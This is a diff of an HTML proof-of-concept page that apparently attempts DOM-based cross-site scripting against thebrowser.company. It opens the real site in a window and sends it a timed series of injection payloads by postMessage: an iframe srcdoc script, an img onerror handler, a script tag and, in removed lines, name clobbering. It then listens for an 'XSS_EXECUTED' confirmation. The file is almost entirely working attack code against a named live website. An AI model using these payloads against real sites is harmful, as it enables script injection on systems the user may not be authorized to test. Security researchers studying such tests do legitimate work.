@@ -2,53 +2,46 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>XSS Test on thebrowser.company</title>
+  <title>PoC – DOM XSS on thebrowser.company</title>
 </head>
 <body>
-  <h2>🚨 DOM XSS PoC – thebrowser.company</h2>
-  <p>الهجوم يبدأ تلقائيًا بمجرد فتح الصفحة</p>
+  <h2>💥 DOM XSS PoC – thebrowser.company</h2>
+  <p>الهجوم يبدأ تلقائيًا...</p>
 
   <script>
-    const target = window.open("https://thebrowser.company/", "_blank");
+    const target = window.open("https://thebrowser.company", "_blank");
 
     const payloads = [
       {
-        desc: "iframe + postMessage",
+        desc: "iframe srcdoc",
         html: `<iframe srcdoc='<script>parent.postMessage("XSS_EXECUTED","*")</script>'></iframe>`
       },
       {
-        desc: "img onerror + postMessage",
+        desc: "img onerror",
         html: `<img src=x onerror="parent.postMessage('XSS_EXECUTED','*')">`
       },
       {
-        desc: "form + iframe name clobbering",
-        html: `<form><input name=parent><iframe name=parent onload="parent.postMessage('XSS_EXECUTED','*')"></iframe></form>`
+        desc: "script injection",
+        html: `<script>parent.postMessage("XSS_EXECUTED","*")</script>`
       }
     ];
 
     let i = 0;
 
     function sendPayload() {
-      if (i >= payloads.length) return;
-      const p = payloads[i];
-      console.log(`🚀 Testing payload: ${p.desc}`);
-      try {
-        target.postMessage({ type: "inject", html: p.html }, "*");
-      } catch (e) {
-        console.error("❌ postMessage failed", e);
-      }
+      if (!target || i >= payloads.length) return;
+      console.log("🚀 Injecting:", payloads[i].desc);
+      target.postMessage({ type: "inject", html: payloads[i].html }, "*");
       i++;
-      setTimeout(sendPayload, 3000);
+      setTimeout(sendPayload, 3000); // إرسال التالي بعد 3 ثواني
     }
 
-    setTimeout(sendPayload, 3000);
+    setTimeout(sendPayload, 4000); // البداية بعد 4 ثواني
 
     window.addEventListener("message", (e) => {
       if (e.data === "XSS_EXECUTED") {
-        alert("✅ XSS EXECUTED");
-        console.log("✅ Payload executed:", e);
-      } else {
-        console.log("📩 Received message:", e.data);
+        alert("✅ XSS EXECUTED!");
+        console.log("🎯 XSS payload confirmed!");
       }
     });
   </script>
